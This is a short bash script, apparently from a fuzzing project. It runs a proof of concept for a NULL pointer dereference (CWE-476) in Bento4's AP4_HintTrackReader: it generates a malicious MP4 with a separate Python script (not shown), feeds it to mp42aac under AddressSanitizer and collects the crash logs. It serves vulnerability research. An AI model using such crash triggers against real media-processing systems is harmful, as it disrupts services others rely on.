#!/bin/bash
# PoC run script for VULN-002: NULL Pointer Dereference in AP4_HintTrackReader
# CWE-476, Ap4HintTrackReader.cpp:70

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4HintTrackReader_cpp"
MP4_FILE="${POC_DIR}/vuln_002.mp4"
RESULT_FILE="${POC_DIR}/vuln_002_result.txt"
ASAN_LOG_PREFIX="${POC_DIR}/asan_002.log"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"

cd "${POC_DIR}"

# Step 1: Generate the malicious MP4
echo "[*] Generating vuln_002.mp4 ..."
python3 vuln_002_gen.py

echo "" > "${RESULT_FILE}"

# Step 2: Run mp42aac with ASAN options
echo "[*] Running mp42aac ..."
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
  "${BINARY}" \
  "${MP4_FILE}" \
  /dev/null \
  >> "${RESULT_FILE}" 2>&1 || true

# Step 3: Collect any ASAN log files produced
for f in "${ASAN_LOG_PREFIX}".*; do
  [ -f "$f" ] && cat "$f" >> "${RESULT_FILE}"
done

echo "[*] Results written to ${RESULT_FILE}"
echo ""
echo "=== Result preview ==="
head -30 "${RESULT_FILE}" || true
